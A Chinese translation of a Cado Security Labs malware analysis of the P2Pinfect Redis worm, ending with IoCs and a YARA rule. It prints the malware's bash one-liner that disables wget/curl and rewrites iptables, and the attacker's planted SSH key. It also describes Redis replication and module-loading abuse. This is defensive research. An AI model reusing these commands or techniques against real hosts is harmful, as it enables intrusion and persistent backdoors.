**原文链接：[Cado Security Labs Encounter Novel Malware, Redis
P2Pinfect](https://www.cadosecurity.com/redis-p2pinfect/ "Cado Security Labs
Encounter Novel Malware, Redis P2Pinfect")  
译者：知道创宇404实验室翻译组**

Cado安全实验室的研究人员最近发现了一种针对Redis数据存储公开访问部署的新型恶意软件，该恶意软件被开发者命名为“p2pinfect”，此软件由Rust
语言进行编写的，主要被用来充当僵尸网络代理。Cado研究人员在分析中发现：该软件还包含一个可移植嵌入式文件（PE）以及一个ELF可执行目标文件，这也表明了该软件可向Windows和Linux
进行跨平台兼容。

在发现时间至此文发布之前，Unit42
的研究人员还发表了一篇针对该恶意软件Windows变种的深入[分析](https://unit42.paloaltonetworks.com/peer-to-peer-worm-p2pinfect/
"分析")。他们发现：[此次遇到的变体是通过利用CVE-2022-0543](https://nvd.nist.gov/vuln/detail/CVE-2022-0543
"此次遇到的变体是通过利用CVE-2022-0543")(Redis的某些版本中存在一个LUA沙盒逃逸漏洞)来传递的。Cado研究人员见证了一种不同的初始访问媒介，这也将在本文中进行进一步阐述。

P2Pinfect概述:

  * 尝试多次利用Redis进行初始访问
  * 利用Rust进行有效载荷开发，使得分析变得更加棘手
  * 使用多种规避技术来阻碍动态分析
  * 对Redis和SSH服务器进行互联网扫描
  * 以类似蠕虫病毒的方式进行自我复制

## 初始访问

Cado的研究人员首次在蜜罐遥测中发现
p2pinfect。该恶意软件通过利用复制功能危害Redis数据存储的暴露实例，其复制功能会允许Redis实例以分布式方式运行，即所谓的[领导者/追随者](https://redis.io/docs/management/replication/
"领导者/追随者")拓扑结构。而这会允许跟随节点充当领导节点的精确副本，从而为数据存储和故障转移提供高可用性。

在云环境中，针对Redis的一种常见攻击模式是利用恶意实例来启用复制，主要是通过连接到一个公开的Redis实例并发出`SLAVEOF`命令。一旦复制完成，攻击者就可以加载一个恶意模块(一个Linux共享对象文件),该模块扩展了Redis本身的功能。这种初始访问载体于2018年被首次展示，此后多次被运用于云恶意软件活动中，其中包含[H2miner](https://www.alibabacloud.com/blog/new-outbreak-of-h2miner-worms-exploiting-redis-rce-detected_595743
"H2miner")和最近的[Headcrab](https://blog.aquasec.com/headcrab-attacks-servers-worldwide-with-novel-state-of-art-redis-malware "Headcrab")。

![img](https://images.seebug.org/content/images/2023/08/02/1690967734000-1hacrj.png-w331s)

P2Pinfect用于初始访问的Redis命令

P2Pinfect使用多种已知的Redis攻击方法进行初始访问，但正是上述方法最终破坏了Cado的蜜罐基础架构。从截图中可以看出一个恶意的`SLAVEOF`命令被下达，这也意味着针对恶意领导者的Cado
Redis被部署复制。

在进行复制后，使用`MODULE
LOAD`命令加载恶意共享对象文件exp.so。这个共享对象扩展了Redis的功能，为攻击者提供了反向shell访问，并添加了新命令`system.exec`，而这会允许在主机上运行任意shell命令。

![](https://images.seebug.org/content/images/2023/08/547d3af6-c6de-4cb3-8532-b94ccbed05fb.webp-w331s)

演示攻击者命令的exp.so反编译片段

`system.exec`通过/dev/tcp反向shell向C2服务器发出命令，检索并执行主要的Linux负载。p2pinfect
试图通过Cron[我们之前描述](https://www.cadosecurity.com/tales-from-the-honeypot-watchdog-evolves-with-a-new-multi-stage-cryptojacking-attack/
"我们之前描述")的未经身份验证的RCE机制来破坏Redis主机。

![](https://images.seebug.org/content/images/2023/08/d639557f-d6f6-49c1-a043-a38156513d39.webp-w331s)

注册恶意cronjob的Redis命令示例

这种滥用`config set dir`命令的方法也可用于攻击者控制的SSH密钥，成功后可确保利用后门进行主机的访问。

P2Pinfect也会通过此漏洞在其他Redis应用失败时提供网络冗余。

## 有效载荷

检索到的主要有效负载是使用Rust的外部函数接口(FFI)库，是一个用C语言和Rust语言组合编写的ELF。有效负载具有一个典型的
`libc_start_main` 入口和一个C语言函数，该函数在其他设置操作中为进程进行系统调用注册了许多`sigaction`
。然后它分成一个典型的Rust
`lang_start`函数，用来执行有效负载的Rust组件。该组件还使用FFI与C函数进行互操作。除此之外，二进制文件还使用了UPX进行打包。

执行后，该二进制文件将更新主机的SSH配置。它使用捆绑的配置文件将 `sshd_config`
文件更新到接近默认状态。而这会删除任何可能妨碍作者通过SSH访问服务器的配置，并启用密码验证。然后重启SSH服务，并将以下密钥放入当前用户的authorized_keys文件中:

    
    
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/2CmHl/eiVchVmng4TEPAxOnO+6R0Rb/W+zlwCR+/g3mHqsiadebQx4rd5Ru/2HnSIut2kxm9Pz4ycxMIP4tNqyeHGpXhngTHnCduUwDofkVwzuy1GtDWXwlZbW3a4FDkPB4QwyHzB62+8G2L8CaG/3v26acRef9UWO2JepanMAkJo0oOrFg/chMbTcrhXwhbesTnb12yhaXBS8KgF1bWkMEqPvAGAFBj1G19dBcThK/qw1Wg2wIEl23kDdc5P4tRVvisYj9s5pqIG/+i9AjAlpS8AEqymmYjA3xUyWc/2D1BytbHIZCn5rGlrTNM1GcB/cCTByqdOEbckBi17cOXBDKmG/NRSj7in71Rh81R54xhIn5FTGGBxtrxXhHVkfyRl23IRCnZevrM41Lra3WaFYNMVgmfjf78L98mAByoSI2ztwYpSksVnrtjLC7o73fLff2Ttyie7tRIkbGcm7wlUP81U6Qk+4AwuxfxRQhol9glY7JqdRmmqjYjfviy10wgLRBhtjdIDWSF18CsL0qW60/3YvYt+AtW0JXMMXq8KKUOWEAqbJTddKTsd0H5nvxbz+pBgeB850DcNwUm+Ko1x6zKbM4KqM8xpQDfFf139ZLsq6aW34jZJ1/2HxNtVs39tt/N1BvoZcsV8yH/du09LWf113BFNmkMYz1YUrT+1w== root@localhost.localdomain

然后，它使用bash运行以下命令:

    
    
    mv /usr/bin/wget /usr/bin/wgbtx;mv /usr/bin/curl /usr/bin/clbtx;iptables -F;iptables -P INPUT ACCEPT;iptables -P OUTPUT ACCEPT;if ! which iptables;then apt-get install -y iptables iptables-services || yum install -y iptables iptables-services || dnf install -y iptables iptables-services || zypper install -y iptables iptables-services || pacman -S --noconfirm iptables iptables-services;fi; if ! which awk;then apt-get install -y gawk || yum install -y gawk || dnf install -y gawk || zypper install -y gawk || pacman -S --noconfirm gawk;fi; if ! which netstat;then apt-get install -y net-tools || yum install -y net-tools || dnf install -y net-tools || zypper install -y net-tools || pacman -S --noconfirm net-tools;fi; redis_ips=$(netstat -tnp | grep ':6379' | grep 'ESTABLISHED' | awk '{print $5}' | awk -F ':' '{print $1}' | sort -u);for ip in $redis_ips;do iptables -A INPUT -p tcp --dport 6379 -s \"$ip\" -j ACCEPT; done; iptables -A INPUT -p tcp --dport 6379 -j DROP; iptables -A INPUT -p tcp --dport <port binary listens on> -j ACCEPT

相关内容：

  * 将`wget` 和curl二进制文件分别重命名为`wgbtx`和`clbtx`。这可能是为了阻止事件响应者使用它们来下拉取证工具，并阻止EDR解决方案检测命令的使用情况。这是针对云威胁参与者的常见TTP 。.
  * 检查`iptables`命令，如果找没有找到则进行安装。它有几个特定于单个包管理器的命令，所以不管使用的是什么Linux发行版，都可以安装它。
  * 检查`awk`命令，如果没有找到则进行安装。和前面的命令一样，它将尝试使用几个包管理器。
  * 检查 `netstat` 命令， a如果没有找到则进行安装。和前面的命令一样，它将尝试使用几个包管理器。
  * 使用`netstat`和`awk`收集当前到目标主机上运行的Redis服务器的所有IP的列表。
  * 添加一个`iptable`的规则，允许从这些IP到redis服务器的上获取流量。
  * 添加一个`iptables`规则，来拒绝所有其他流量到redis服务器。
  * 添加一个`iptables`允许所有流量流向随机选择的端口的规则，主要有效负载在该端口上侦听僵尸网络通信。

由于Redis服务器是已知的易受攻击的，恶意软件使用`iptables`表明这是为了防止任何其他威胁行为者破坏Redis服务器，同时仍然允许Redis服务器的合法运营商仍然访问服务器，以免信息泄露。

为了在重新启动后建立持久性，二进制文件会写入`/path/to/binary <base64 encoded node
list>`到`.bash_logout.`无论是通过TTY还是通过SSH退出任何bash会话，都会导致二进制文件重新显示。通常，这可以通过使用`.bashrc`登录时运行命令，但使用`.bash_logout`是在注销之后生成的，这可以确保任何执行系统检查的分析人员都没有机会发现该进程。

## 丢弃的有效载荷

一个名为`bash` 的二进制文件被放入 `/tmp` ，并使用 `execv()` 运行，参数为`-bash` 。这样做的结果是，当在 `ps aux`
运行后，文件会自动删除。 `bash` 二进制文件扫描 `/proc`
，并打开`stat`中的每个进程，并监视`/proc`变更目录，如果二进制文件被终止，它将重新启动主负载，如下所示：

![](https://images.seebug.org/content/images/2023/08/09faf48d-67df-43cb-bb00-7f35902858e8.webp-w331s)

被丢弃的bash二进制文件重新显示被终止的负载的审计日志

`bash`还能够在主二进制文件上执行升级。它读取主二进制文件，并验证它与从僵尸网络中提取的最新签名文件是否匹配。如果不匹配(如：篡改或有新版本可用)，则旧实例被终止，新版本以随机名称下载到相同目录然后执行。

主二进制文件还将监控文件操作的其他进程。由于一些不明确的标准(如打开的文件数量和IOPS)，它会试图杀死超过阈值的进程。据推测，这是为了尝试检测事件响应或分析工具，列举磁盘或创建内存转储。

![img](https://images.seebug.org/content/images/2023/08/02/1690967740000-5qylww.png-w331s)

内核跟踪日志显示了向其他进程发送信号的示例

除了bash之外，一个名为miner的二进制文件的副本以一个随机的名称放在当前目录中被执行然后删除。尽管名字如此，但这个二进制文件实际上并不是一个加密旷工。唯一观察到的行为是它重复进行休眠调用。然而，由于僵尸网络操作员可以随时更新二进制文件，因此该有效负载可能只是处于休眠状态，等待僵尸网络增长到特定规模时才能被激活。

## 僵尸网络

P2Pinfect恶意软件针对僵尸网络的利用点。每台受感染的服务器都被视为一个节点，然后该节点会连接到其他受感染的服务器。假设命令是通过在网络上传播签名的消息来发布的，这会使得整个僵尸网络可以在不使用集中式C2服务器的情况下互相牵连。

启动后，二进制文件开始在0.0.0.0上监听，端口随机选择，通常在60100和60150之间。该端口用于与其他对等端通信，在一个简单的HTTP服务器上提供大量有效负载，并使用HTTPS进行实际的僵尸网络协调。HTTPS服务器主要使用硬编码证书（该证书在所有僵尸网络成员中都是相同的），很可能该证书也被用作客户端证书以向服务器进行身份验证(相互TLS)。

    
    
    Certificate:
        Data:
            Version: 3 (0x2)
            Serial Number:
                a8:ef:2b:a4:7e:63:82:e4
            Signature Algorithm: sha256WithRSAEncryption
            Issuer: C = US, O = Anonymous, CN = localhost
            Validity
                Not Before: Jun 29 09:34:17 2023 GMT
                Not After : Jun  5 09:34:17 2123 GMT
            Subject: C = US, O = Anonymous, CN = localhost
            Subject Public Key Info:
                Public Key Algorithm: rsaEncryption
                    RSA Public-Key: (2048 bit)
                    Modulus:
                        00:d5:7c:72:5f:60:6a:72:e1:eb:c9:77:65:d1:85:
                        83:dd:e0:6c:d5:69:00:da:3e:17:af:44:8c:c8:3b:
                        ad:24:7a:f3:c2:6e:a9:ac:a1:60:0a:0c:5c:b3:b8:
                        6a:a7:eb:e6:4c:80:19:80:53:91:f8:d3:db:87:0e:
                        97:85:f4:01:42:a1:3b:42:e6:4a:7c:d2:d3:23:a5:
                        97:32:af:ed:a6:51:38:de:12:a8:ae:bd:9b:0e:85:
                        d8:66:d1:14:d9:af:f4:24:12:72:65:3f:31:7e:b9:
                        f1:06:0a:8b:60:a5:dc:95:c7:d2:ce:4c:99:ab:ab:
                        c4:cf:3f:75:a9:11:72:55:4b:1e:d1:18:a1:2a:ab:
                        85:16:5c:0d:67:b5:47:63:d4:bc:fb:d3:0c:37:61:
                        2e:04:0b:1c:49:9a:ea:3e:47:b6:aa:60:fd:3a:2c:
                        70:fb:d5:4f:34:bc:11:81:f1:cf:db:5f:6e:8e:9f:
                        6a:e1:eb:eb:33:07:b4:c5:56:d1:03:df:35:82:1e:
                        42:43:1e:41:f7:6a:8e:fb:14:c4:83:09:c4:f1:8f:
                        2e:a3:ad:20:a3:5f:f7:31:95:d3:45:e3:7d:ed:03:
                        9b:c9:17:a2:80:b1:6b:82:fa:0b:bd:c1:c0:63:81:
                        4a:0c:4d:92:10:7b:d4:b1:2f:32:68:a7:1a:1a:22:
                        02:0f
                    Exponent: 65537 (0x10001)
            X509v3 extensions:
                X509v3 Subject Alternative Name: 
                    DNS:localhost
        Signature Algorithm: sha256WithRSAEncryption
             44:69:f8:4f:8c:a6:6c:d6:a5:ca:6c:15:f7:d9:de:87:ed:79:
             15:a4:b6:1f:3d:ae:f1:4b:5a:33:70:d8:28:bb:97:24:29:8b:
             89:6c:e9:54:93:7d:dc:53:10:49:cd:31:78:eb:95:5c:ee:33:
             84:41:6b:cc:2c:e1:69:9c:08:c5:c0:56:a9:18:4f:98:06:0a:
             b8:d6:00:3e:24:fa:87:7c:95:a4:e1:40:35:6c:68:a3:a6:e4:
             59:31:59:8b:72:aa:97:96:ea:d8:74:79:d8:b3:05:79:3e:11:
             ed:ea:2d:33:e8:b4:da:21:24:38:ff:19:06:62:37:d8:5d:ec:
             4e:28:be:da:17:3c:b0:ba:51:31:41:12:2d:84:30:69:c6:67:
             9f:ba:8b:d1:4c:0a:d2:57:d2:55:4d:63:22:9d:87:c7:36:e9:
             d3:28:82:59:8a:cb:c6:5e:06:c2:d2:e3:0f:28:df:29:71:ea:
             79:39:ae:ff:36:e2:3d:93:51:4a:80:8d:38:c9:ba:a2:f8:ed:
             6f:a2:ee:de:4e:a5:ff:61:49:58:62:e7:d6:53:05:09:ac:a0:
             7c:61:a9:72:9e:9f:a5:c5:82:21:7a:20:62:2e:27:6d:85:11:
             ce:7e:ae:10:0e:18:e6:3e:3c:d9:ef:18:be:8e:17:e7:c9:b1:
             a7:ce:f3:36

从证书的颁发日期来看，这场攻击活动很可能是在6月29日之后开始的。

二进制文件以逗号分隔的IP和端口对列表启动，这些IP和端口对经过加密，然后以base64编码作为其第一个参数。它将访问这些服务器之一，以获取以下所有二进制文件的副本:

  * Linux–Linux系统的主要ELF有效负载
  * 用于Windows系统的windows主PE负载
  * miner–ELF二进制linux系统
  * win miner–用于windows系统的PE二进制文件 -`<name>_sign`文件，其中包含二进制的加密签名

然后使用HTTP服务器提供这些二进制文件(这样其他新的对等点可以获得一个副本)。

然后，二进制文件将自己注册给其他僵尸网络对等体。它通过在`/ip`上发送HTTP请求来实现这一点，该请求返回正在运行的恶意软件的本地主机IP。恶意软件试图从ipv4.icanhazip.com获取其IP，但是由于这是恶意软件的常见TTP，该请求可能会被阻止或欺骗，因此它可能会使用其他对等体进行检查。而这也可以用于验证对等体是否在线，接着它会与每个对等体建立TLS连接。

![](https://images.seebug.org/content/images/2023/08/129b50ae-788c-490f-bb25-4e1b9ca01045.webp-w331s)

对icanhazip和/ip的HTTP请求

## 爬虫

此时，二进制文件将尝试感染更多的主机。二进制文件将读取bash_history、ssh
config和已知的hosts文件，以收集用户、IPs和ssh密钥的列表。然后，使用这些信息来尝试感染新的实例。该二进制文件还将选择一个随机的/16网络前缀来扫描暴露的SSH和Redis服务器，并使用密码列表来尝试暴力破解它遇到的相关服务器。

In the case of Redis servers, it will attempt to exploit the LUA sandbox
escape vulnerability or use the `SLAVEOF` and `MODULE LOAD` commands to load a
malicious module, as previously discussed.

在Redis服务器下，它将试图利用LUA沙箱逃逸漏洞或使用`SLAVEOF`和`MODULE LOAD`加载恶意模块的命令，如前所述：

![](https://images.seebug.org/content/images/2023/08/3e518ab6-22e5-4c0f-bf99-3c597e8ae7d7.webp-w331s)

恶意软件使用的密码列表

一旦获得对主机的访问权限，它就会以最初受感染的服务器相同方式感染主机，即丢弃自身的副本(从内置的HTTP服务器获取)并使用nodelist
作为参数来执行该副本。

## 结论

P2Pinfect设计精良，利用了复杂的复制和C2技术。选择使用Rust还可以使代码更容易跨平台移植(Windows和Linux二进制文件共享大量相同的代码)，同时也使代码的静态分析变得更加困难。这是由于Rust本身的复杂性(外来函数接口特性而包含C代码)，致使缺少可用于分析的工具。

Cado研究人员遇到的样本与Unit42分析的Windows变体具有相似的功能。尽管如此，但他们最初的访问方法却不同，而且
Cado研究人员没有任何证据表明恶意软件是专门针对云环境的。从分析过程中收集的信息来看，不管是本地的还是云托管的，P2Pinfect可能会在大多数Linux主机上运行的。

Cado安全实验室同意Unit42关于矿工有效载荷的发现。Cado研究人员没有从这个恶意软件样本中观察到任何可归因于加密货币挖掘的行为，这使得运营商可以快速部署他们选择的任何有效载荷，而我们也将继续监控这种恶意软件并在发生时发布更新。

Cado Security客户可以使用Cado平台识别受到 P2Pinfect 感染的主机。

## IoCs

**Filename** | **SHA256**  
---|---  
linux | 87a3fc1088449dbd3554fe029a1878a525e64ab4ccf71b23edb03619ba94403a  
miner | b1fab9d92a29ca7e8c0b0c4c45f759adf69b7387da9aebb1d1e90ea9ab7de76c  
bash | ce047893ac5bd2100db3448bd62c324e471ffcddd48433788bfe885e5f071a89  
  
## Yara Rule

    
    
    rule P2Pinfect {
        meta:
            description = "Detects P2Pinfect worm on Linux"
            author = "nbill@cadosecurity.com"
            license = "Apache License 2.0"
            date = "2023-07-28"
            hash1 = "87a3fc1088449dbd3554fe029a1878a525e64ab4ccf71b23edb03619ba94403a"
            hash2 = "ce047893ac5bd2100db3448bd62c324e471ffcddd48433788bfe885e5f071a89"
            hash3 = "b1fab9d92a29ca7e8c0b0c4c45f759adf69b7387da9aebb1d1e90ea9ab7de76c"
        strings:
            $magic = { 7f 45 4c 46 }
    
            $a1 = "p2pinfect"
            $a2 = "p2pmod"
    
            $b1 = { 48 8D 35 C2 13 22 00 6A 19 5A 4C 89 FF E8 A3 EF 17 00 48 8D 35 C9 13 22 00 6A 1E 5A 4C 89 FF E8 91 EF 17 00 48 8D 35 D5 13 22 00 6A 0E 5A 4C 89 FF E8 7F EF 17 00 48 8D 35 D1 13 22 00 6A 0F 5A 4C 89 FF E8 6D EF 17 00 48 8D 35 81 A5 21 00 4C 89 FF 4C 89 F2 E8 5B EF 17 00 }
            $b2 = { 48 83 E4 80 48 81 EC 80 0F 00 00 48 C7 04 24 00 00 00 00 48 81 EC 00 05 00 00 49 89 D0 49 89 F5 48 89 BC 24 88 00 00 00 0F B6 86 20 08 00 00 48 8D 0D A3 4D 18 00 48 63 04 81 48 01 C8 6A 01 5E 6A 02 41 5F 4C 89 6C 24 48 48 89 94 24 90 00 00 00 FF E0 }
            $b3 = { 4C 89 F7 49 89 D8 E8 10 BB 00 00 49 83 66 68 00 49 C7 46 70 0A 00 00 00 66 41 C7 46 78 01 00 6A 10 59 48 8D 84 24 50 04 00 00 48 89 C7 4C 89 F6 F3 48 A5 48 89 C7 E8 FA 76 01 00 }
            $b4 = { 48 8B 3D 0F 3F 06 00 48 8B 35 10 3F 06 00 E8 20 8E 04 00 49 8B 46 10 48 89 05 08 3F 06 00 41 0F 10 06 0F 11 05 ED 3E 06 00 48 8D 35 A4 D0 FF FF 6A 0F 5F FF 15 25 3D 06 00 48 83 F8 FF 75 06 }
            $b5 = { 49 29 F7 4C 89 F7 4C 89 FA FF 15 DB 92 21 00 48 8B 84 24 40 02 00 00 4C 01 E0 48 8B 8C 24 98 02 00 00 48 89 01 48 8B 84 24 80 00 00 00 48 89 28 48 8B BC 24 68 01 00 00 48 8D 77 10 48 8B 84 24 48 02 00 00 48 F7 D0 48 8B 94 24 50 02 00 00 48 01 C2 48 C1 E2 04 FF 15 FE 92 21 00 4C 8B A4 24 10 01 00 00 49 83 FC 01 4C 8B 3C 24 48 8B B4 24 38 01 00 00 0F 86 C0 02 00 00 }
        condition:
            $magic at 0 and (all of ($a*) or any of ($b*))
    }

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/2099/>

